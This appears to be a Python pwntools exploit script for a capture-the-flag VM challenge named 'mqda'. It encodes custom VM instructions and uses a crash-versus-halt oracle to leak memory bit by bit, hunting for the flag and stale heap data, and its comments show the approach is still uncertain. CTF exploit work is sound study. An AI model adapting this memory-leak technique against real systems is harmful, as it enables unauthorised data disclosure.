#!/usr/bin/env python3
"""
Exploit for mqda VM - bit-by-bit flag exfiltration using oracle.

The vulnerability: PUSH/POP at offset 0xFF in a page accesses OOB.
However, the main exploit is simpler: we can leak arbitrary memory
content via the oracle.

Strategy:
1. The flag is presumably loaded into memory somehow (maybe via wrapper)
2. Or we need to use the heap leak to find interesting pointers
3. Then exfiltrate them bit by bit

Actually, the simplest approach: if we can read ANY memory via the VM,
we can leak it via the oracle. Let's see what we can access.

The VM has a flat 32-bit address space. Pages are demand-paged.
If we access an address, a page gets allocated. Pages are NOT zeroed.
So we can potentially read stale heap data!
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

# VM instruction encoders
def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test_code(read_addr, bit_position, expected_bit):
    """Create code that terminates if bit at read_addr[bit_position] == expected_bit."""
    code = b''
    
    # Set SP to read_addr (adjusted so we read at that address)
    # POP reads from [SP] and increments SP
    # So we need SP pointing to the address we want to read
    code += mov_reg_imm(15, read_addr)
    
    # Pop value into r0
    code += pop_reg(0)
    
    # Isolate the target bit:
    # 1. Shift left to put target bit in MSB (position 31)
    # 2. Shift right by 31 to get just that bit (0 or 1)
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    # Now r0 is 0 or 1
    # Compare with expected_bit
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    # JNE jumps when values are EQUAL (inverted semantics)
    # So if r0 == expected_bit, we jump to HLT
    current = len(code)
    hlt_offset = current + 6 + 2 + 1  # mov_reg_imm(6) + jne(2) + illegal(1)
    
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(read_addr, bit_position, expected_bit=1):
    """Test if bit at position equals expected_bit. Returns True if it matches."""
    code = create_bit_test_code(read_addr, bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(read_addr):
    """Leak a single byte using bit-by-bit oracle."""
    val = 0
    for bit in range(8):
        if test_bit(read_addr, bit, expected_bit=1):
            val |= (1 << bit)
    return val

def leak_dword(read_addr):
    """Leak a 32-bit value using bit-by-bit oracle."""
    val = 0
    for bit in range(32):
        if test_bit(read_addr, bit, expected_bit=1):
            val |= (1 << bit)
    return val

def leak_bytes(start_addr, length):
    """Leak multiple bytes."""
    result = b''
    for i in range(length):
        byte = leak_byte(start_addr + i)
        result += bytes([byte])
        sys.stdout.write(f"\r[*] Leaked {i+1}/{length} bytes: {result[:20]}...")
        sys.stdout.flush()
    print()
    return result

def main():
    print("[*] mqda VM Flag Exfiltration Exploit")
    print("[*] ================================")
    
    # The key insight is that we can read from our own code!
    # So let's verify by reading the code we upload.
    
    # First, let's figure out where interesting data might be.
    # We'll upload code at address 0, so code[0..3] should match.
    
    # The code for test_bit(0, 0, 1) starts with:
    # mov r15, 0x00000000 = [0x41, 0x0f, 0x00, 0x00, 0x00, 0x00]
    # So first byte should be 0x41
    
    print("[*] Verifying bit leak works by reading code byte 0...")
    byte0 = leak_byte(0)
    print(f"[+] Code byte 0: 0x{byte0:02x} (expected: 0x41)")
    
    if byte0 == 0x41:
        print("[+] Oracle verified!")
    else:
        print(f"[-] Unexpected value - code changes per request")
        # The code changes because read_addr changes!
        # For read_addr=0, code[0] = mov r15, 0 = 0x41, 0x0f, ...
    
    # Now, what can we actually exfiltrate?
    # The flag is in ./flag file, but there's no file I/O
    # We need to figure out another approach...
    
    # Wait - maybe the flag is loaded by a wrapper script?
    # In AWD, the flag might be passed as environment variable or argument
    
    # Let me try to read from high addresses to see if we can find
    # any interesting data in the heap
    
    print("\n[*] Trying to read from various addresses to find interesting data...")
    
    # Try reading from address 0x10000000 (high address that might wrap or have data)
    print("\n[*] Reading first 20 bytes from address 0x10000...")
    data = leak_bytes(0x10000, 20)
    print(f"[*] Data: {data.hex()}")
    print(f"[*] ASCII: {data}")
    
if __name__ == '__main__':
    main()
